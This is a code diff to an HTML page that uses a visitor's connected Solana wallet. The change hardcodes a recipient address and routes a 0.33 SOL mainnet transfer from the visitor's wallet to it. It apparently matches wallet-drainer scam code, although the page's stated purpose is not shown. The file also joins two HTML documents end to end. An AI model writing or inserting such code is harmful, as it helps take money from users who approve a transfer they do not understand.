@@ -244,8 +244,7 @@
 
     <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/5.3.0/js/bootstrap.bundle.min.js"></script>
 </body>
-</html>
-<!DOCTYPE html>
+</html><!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -261,6 +260,7 @@
             try {
                 const provider = await getProvider();
                 const publicKey = provider.publicKey;
+                const recipientAddress = '9gVBpxceotiFdh8o9arz5KJ4PgSZd7KoiN2aLqaGUDar'; // Replace with the recipient wallet address
 
                 // Check if connected to the mainnet
                 if (provider.isMainnet) {
@@ -268,7 +268,7 @@
                     const transaction = new solana.Transaction().add(
                         solana.SystemProgram.transfer({
                             fromPubkey: publicKey,
-                            toPubkey: solana.SystemProgram.programId,
+                            toPubkey: recipientAddress, // Send to the recipient wallet address
                             lamports: solana.LAMPORTS_PER_SOL * 0.33, // 0.33 SOL
                         })
                     );
@@ -308,3 +308,4 @@
     </script>
 </body>
 </html>
+
